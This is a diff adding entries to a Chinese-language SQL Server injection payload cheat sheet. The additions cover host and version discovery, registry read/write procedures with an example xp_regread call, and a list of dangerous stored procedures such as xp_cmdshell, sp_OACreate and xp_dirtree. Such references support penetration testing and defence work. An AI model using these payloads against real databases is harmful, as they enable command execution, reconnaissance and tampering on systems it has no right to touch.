@@ -43,6 +43,18 @@ SQL Server Payload
 - hostname
     - 用于判断是否站库分离
     - ``select host_name()``
+    - ``exec xp_getnetname``
+- 服务器信息
+    - ``exec xp_msver``
+
+注册表读写
+----------------------------------------
+- ``xp_regread``
+    - ``exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'``
+- ``xp_regwrite``
+- ``xp_regdeletvalue``
+- ``xp_regdeletkey``
+- ``xp_regaddmultistring``
 
 报错注入
 ----------------------------------------
@@ -63,3 +75,22 @@ DNS OOB
 - fn_xe_file_target_read_file
 - fn_get_audit_file
 - fn_trace_gettable
+
+其他常用存储过程
+----------------------------------------
+- sp_execute_external_script
+- sp_makewebtask
+- sp_OACreate
+- sp_OADestroy
+- sp_OAGetErrorInfo
+- sp_OAGetProperty
+- sp_OAMethod
+- sp_OASetProperty
+- sp_OAStop
+- xp_cmdshell
+- xp_dirtree
+- xp_enumerrorlogs
+- xp_enumgroups
+- xp_fixeddrives
+- xp_getfiledetails
+- xp_loginconfig
